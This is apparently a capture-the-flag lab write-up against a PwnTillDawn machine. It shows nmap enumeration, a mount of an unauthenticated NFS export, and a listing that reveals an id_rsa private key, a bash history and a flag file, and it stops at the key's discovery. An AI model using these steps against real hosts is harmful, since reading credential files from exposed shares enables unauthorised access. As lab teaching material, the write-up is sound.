![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/3329c9b7-c522-490d-8b24-821c78dc2505)

First start enumeration with nmap

```
nmap -sC -sV -T4 -oN normal.txt -p 22,111,2049,8089,34154,40110 -Pn 10.150.150.134
```

```
# Nmap 7.93 scan initiated Sun May 14 08:28:23 2023 as: nmap -sC -sV -T4 -oN normal.txt -p 22,111,2049,8089,34154,40110 -Pn 10.150.150.134
Nmap scan report for 10.150.150.134
Host is up (0.16s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 5.3p1 Debian 3ubuntu7.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 f6e93fcf88ec7c35639134aa145549cc (DSA)
|_  2048 201de9906f4b82a3711ea999957f31ea (RSA)
111/tcp   open  rpcbind  2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/udp   nfs
|   100005  1,2,3      34154/tcp   mountd
|   100005  1,2,3      50354/udp   mountd
|   100021  1,3,4      45783/tcp   nlockmgr
|   100021  1,3,4      48262/udp   nlockmgr
|   100024  1          38840/udp   status
|_  100024  1          40110/tcp   status
2049/tcp  open  nfs      2-4 (RPC #100003)
8089/tcp  open  ssl/http Splunkd httpd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2019-10-28T09:51:59
|_Not valid after:  2022-10-27T09:51:59
|_http-server-header: Splunkd
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: splunkd
34154/tcp open  mountd   1-3 (RPC #100005)
40110/tcp open  status   1 (RPC #100024)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun May 14 08:29:02 2023 -- 1 IP address (1 host up) scanned in 39.24 seconds
```
cool we know what ports and services are available, let's start enumeration with nfs.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/pwntilldawn/10.150.150.134]
└─$ showmount -e 10.150.150.134                               
Export list for 10.150.150.134:
/srv/exportnfs 10.0.0.0/8
```
first check the available dir to mount

```                                                                                                                                                                  
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/pwntilldawn/10.150.150.134]
└─$ sudo mount -t nfs -o vers=3 10.150.150.134:/srv/exportnfs /tmp/mount -v -o nolock
mount.nfs: timeout set for Sun May 14 08:55:06 2023
mount.nfs: trying text-based options 'vers=3,nolock,addr=10.150.150.134'
mount.nfs: prog 100003, trying vers=3, prot=6
mount.nfs: trying 10.150.150.134 prog 100003 vers 3 prot TCP port 2049
mount.nfs: prog 100005, trying vers=3, prot=17
mount.nfs: trying 10.150.150.134 prog 100005 vers 3 prot UDP port 50354
```
cool we mount the dir, let's check what's in the mounted dir.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[/tmp/mount]
└─$ ls -al           
total 44
drwxr-xr-x  5 nobody    nogroup    4096 Oct 29  2019 .
drwxrwxrwt 19 root      root      12288 May 14 08:48 ..
-rw-------  1 nobody    nogroup     667 Oct 29  2019 .bash_history
drwxr-xr-x  5 nobody    nogroup    4096 Oct 29  2019 .config
-rw-r--r--  1 n16hth4wk n16hth4wk    41 Oct 22  2019 FLAG49
-rw-r--r--  1 n16hth4wk n16hth4wk  1675 Oct  3  2019 id_rsa
-rw-r--r--  1 n16hth4wk n16hth4wk   397 Oct  3  2019 id_rsa.pub
drwxr-xr-x  3 nobody    nogroup    4096 Oct 29  2019 .local
drwxr-xr-x  3 nobody    nogroup    4096 Oct 29  2019 .mozilla
```
cool we have `id_rsa` key 

